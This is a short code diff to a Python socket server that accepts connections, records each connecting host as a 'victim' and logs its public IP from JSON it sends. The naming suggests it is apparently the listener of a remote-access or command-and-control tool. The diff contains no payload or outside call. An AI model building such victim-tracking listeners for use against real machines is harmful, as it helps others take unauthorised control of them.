@@ -1,3 +1,5 @@
+import json
+
 import select, socket, hashlib
 
 BUFSIZE: int = 8192
@@ -31,7 +33,8 @@ class Server:
             server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server.bind((self.ip, self.port))
             server.listen()
-            # server.setblocking(False)
+
+            print('[+] Waiting for connections...')
 
             inputs = [server]
 
@@ -41,11 +44,13 @@ class Server:
                 for sock in readable:
                     if sock == server:
                         victim, addr = sock.accept()
-                        # victim.setblocking(False)
                         inputs.append(victim)
 
                     else:
-                        data = sock.recv(BUFSIZE)
+                        print(
+                            f'[+] Got connection')
+
+                        data: bytes = sock.recv(BUFSIZE)
 
                         if data:
                             info_hash = hashlib.sha256(data).hexdigest()
@@ -54,6 +59,8 @@ class Server:
                                 pass
 
                             else:
+                                print(
+                                    f'[+] Got connection from: {json.loads(data.decode(encoding=ENCODING))['victim']['public_ip']}')
                                 self.victims[info_hash] = [sock, data]
 
                         else:
